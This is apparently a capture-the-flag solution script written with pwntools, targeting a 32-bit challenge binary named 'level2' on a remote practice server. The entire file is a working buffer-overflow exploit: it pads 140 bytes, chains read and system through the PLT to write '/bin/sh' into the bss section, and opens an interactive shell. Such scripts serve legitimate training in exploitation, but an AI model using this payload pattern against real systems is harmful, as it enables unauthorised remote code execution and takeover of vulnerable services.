from pwn import*
elf=ELF('./level2')
p=remote('node4.buuoj.cn',29200)
#p=process('./level2')
context.log_level='debug'
bss=0x804a020
read=elf.plt['read']
system=elf.plt['system']

payload=b'a'*140+p32(read)+p32(system)+p32(0)+p32(bss)+p32(8)
p.sendline(payload)
p.sendline(b'/bin/sh\x00')
p.interactive()
